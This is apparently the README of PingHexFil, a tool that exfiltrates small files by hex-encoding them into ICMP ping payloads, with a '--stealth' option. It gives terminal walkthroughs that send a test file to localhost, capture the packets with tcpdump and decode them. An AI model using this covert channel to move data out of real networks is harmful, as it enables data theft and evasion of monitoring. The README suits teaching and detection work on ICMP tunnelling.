# PingHexFil
Exfiltration of small files using ICMP
## Data Exfiltration using ICMP
Pass a file name, destination IP address, and "--stealth" (optional), to the application. The application will chunk the file into 60K sizes and send each "chunk" as the data payload of the ICMP request to the destination IP address. Ensure that you are capturing ICMP packets at the destination before sending. You can do this using Wireshark.
## Usage
The following is done with the example file, `examples/example1.txt`
### Step 1: Send the Bytes via ICMP
```
root@demon:~/pinghexfil# ls
decoder.py  examples  images  payloads  pinghexfil.py  README.md
root@demon:~/pinghexfil# cat examples/example1.txt 
This is a test file.
OK.
root@demon:~/pinghexfil# ./pinghexfil.py 127.0.0.1 examples/example1.txt 
[+] Opening file: examples/example1.txt
[+] Sending data as: 54686973206973206120746573742066696c652e0a4f4b2e0a
.
Sent 1 packets.
Exiting.
root@demon:~/pinghexfil# 
```
### Step 2: Listen for ICMP Requests on Destination
To do this we can simply use tcpdump:
```
root@demon:~/# tcpdump -vvi lo icmp[icmptype]==8 -w fileexfil.pcap
tcpdump: listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
^C2 packets captured
4 packets received by filter
0 packets dropped by kernel
root@demon:~/# 
```
Then view with *Wireshark*:
```
root@demon:/# wireshark fileexfil.pcap
```
### Step 3: Decode the Bytes
```
root@demon:~/pinghexfil# ./decoder.py payloads/example1.txt 
[+] Opening file: payloads/example1.txt
[+] file data: 54686973206973206120746573742066696c652e0a4f4b2e0a

This is a test file.
OK.

root@demon:~/pinghexfil# 
```
